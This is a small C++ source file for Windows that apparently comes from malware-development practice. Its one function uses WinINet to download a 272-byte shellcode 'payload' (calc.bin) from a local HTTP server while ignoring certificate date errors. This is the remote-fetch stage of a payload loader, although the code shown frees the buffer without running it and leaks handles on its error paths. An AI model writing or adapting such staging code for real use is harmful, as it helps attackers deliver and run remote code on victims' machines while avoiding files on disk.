#include <iostream>
#include <Windows.h>
#include <wininet.h>

BOOL GetPayloadFromUrl() {
	DWORD dwBytesRead = NULL;

	//opening internet session handle
	HINTERNET hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (!hInternet) {
		std::wcerr << L"[!] InternetOpenW Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	//opening handle to the payload url
	HINTERNET hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (!hInternetFile) {
		std::wcerr << L"[!] InternetOpenUrlW Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	//allocating buffer to payload
	PBYTE pBytes = (PBYTE)LocalAlloc(LPTR, 272);

	//read the payload
	if (!InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)) {
		std::wcerr << L"[!] InternetReadFile Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}